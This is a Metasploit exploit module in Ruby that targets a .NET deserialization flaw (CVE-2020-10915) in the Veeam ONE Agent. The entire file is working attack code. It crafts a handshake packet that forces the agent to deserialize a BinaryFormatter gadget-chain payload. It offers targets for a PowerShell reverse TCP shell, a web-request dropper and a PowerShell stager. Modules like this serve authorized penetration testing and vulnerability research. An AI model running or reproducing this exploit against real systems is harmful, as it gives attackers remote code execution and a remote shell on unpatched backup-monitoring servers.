# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;Veeam ONE Agent .NET Deserialization&#039;,
        &#039;Description&#039; => %q{
          This module exploits a .NET deserialization vulnerability in the Veeam
          ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the
          9 and 10 release lines.

          Specifically, the module targets the HandshakeResult() method used by
          the Agent. By inducing a failure in the handshake, the Agent will
          deserialize untrusted data.

        },
        &#039;Author&#039; => [
          &#039;Michael Zanetta&#039;, # Discovery
          &#039;Edgar Boda-Majer&#039;, # Discovery
          &#039;wvu&#039; # Module
        ],
        &#039;References&#039; => [
          [&#039;CVE&#039;, &#039;2020-10914&#039;],
          [&#039;CVE&#039;, &#039;2020-10915&#039;], # This module
          [&#039;ZDI&#039;, &#039;20-545&#039;],
          [&#039;ZDI&#039;, &#039;20-546&#039;], # This module
          [&#039;URL&#039;, &#039;https://www.veeam.com/kb3144&#039;]
        ],
        &#039;DisclosureDate&#039; => &#039;2020-04-15&#039;, # Vendor advisory
        &#039;License&#039; => MSF_LICENSE,
        &#039;Platform&#039; => &#039;win&#039;,
        &#039;Arch&#039; => [ARCH_CMD, ARCH_X86, ARCH_X64],
        &#039;Privileged&#039; => false,
        &#039;Targets&#039; => [
          [
            &#039;Windows Command&#039;,
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Type&#039; => :win_cmd,
            &#039;DefaultOptions&#039; => {
              &#039;PAYLOAD&#039; => &#039;cmd/windows/powershell_reverse_tcp&#039;
            }
          ],
          [
            &#039;Windows Dropper&#039;,
            &#039;Arch&#039; => [ARCH_X86, ARCH_X64],
            &#039;Type&#039; => :win_dropper,
            &#039;DefaultOptions&#039; => {
            }
          ],
          [
            &#039;PowerShell Stager&#039;,
            &#039;Arch&#039; => [ARCH_X86, ARCH_X64],
            &#039;Type&#039; => :psh_stager,
            &#039;DefaultOptions&#039; => {
            }
          ]
        ],
        &#039;DefaultTarget&#039; => 2,
        &#039;DefaultOptions&#039; => {
          &#039;WfsDelay&#039; => 10
        },
        &#039;Notes&#039; => {
          &#039;Stability&#039; => [SERVICE_RESOURCE_LOSS], # Connection queue may fill?
          &#039;Reliability&#039; => [REPEATABLE_SESSION],
          &#039;SideEffects&#039; => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(2805),
      OptString.new(
        &#039;HOSTINFO_NAME&#039;,
        [
          true,
          &#039;Name to send in host info (must be recognized by server!)&#039;,
          &#039;AgentController&#039;
        ]
      )
    ])
  end

  def check
    vprint_status("Checking connection to #{peer}")
    connect

    CheckCode::Detected("Connected to #{peer}.")
  rescue Rex::ConnectionError => e
    CheckCode::Unknown("#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def exploit
    print_status("Connecting to #{peer}")
    connect

    print_status("Sending host info to #{peer}")
    sock.put(host_info(datastore[&#039;HOSTINFO_NAME&#039;]))

    res = sock.get_once
    vprint_good("<-- Host info reply: #{res.inspect}") if res

    print_status("Executing #{target.name} for #{datastore[&#039;PAYLOAD&#039;]}")

    case target[&#039;Type&#039;]
    when :win_cmd
      execute_command(payload.encoded)
    when :win_dropper
      # TODO: Create an option to execute the full stager without hacking
      # :linemax or calling execute_command(generate_cmdstager(...).join(...))
      execute_cmdstager(
        flavor: :psh_invokewebrequest, # NOTE: This requires PowerShell >= 3.0
        linemax: 9001 # It&#039;s over 9000
      )
    when :psh_stager
      execute_command(cmd_psh_payload(
        payload.encoded,
        payload.arch.first,
        remove_comspec: true
      ))
    end
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Serializing command: #{cmd}")

    serialized_payload = Msf::Util::DotNetDeserialization.generate(
      cmd,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter # This is _exactly_ what we need
    )

    print_status("Sending malicious handshake to #{peer}")
    sock.put(handshake(serialized_payload))

    res = sock.get_once
    vprint_good("<-- Handshake reply: #{res.inspect}") if res
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def host_info(name)
    meta = [0x0205].pack(&#039;v&#039;)
    packed_name = [name.length].pack(&#039;C&#039;) + name

    pkt = meta + packed_name

    vprint_good("--> Host info packet: #{pkt.inspect}")
    pkt
  end

  def handshake(serialized_payload)
    # A -1 status indicates a failure, which will trigger the deserialization
    status = [-1].pack(&#039;l<&#039;)

    length = status.length + serialized_payload.length
    type = 7
    attrs = 1
    kontext = 0

    header = [length, type, attrs, kontext].pack(&#039;VvVV&#039;)
    padding = "\x00" * 18
    result = status + serialized_payload

    pkt = header + padding + result

    vprint_good("--> Handshake packet: #{pkt.inspect}")
    pkt
  end

end

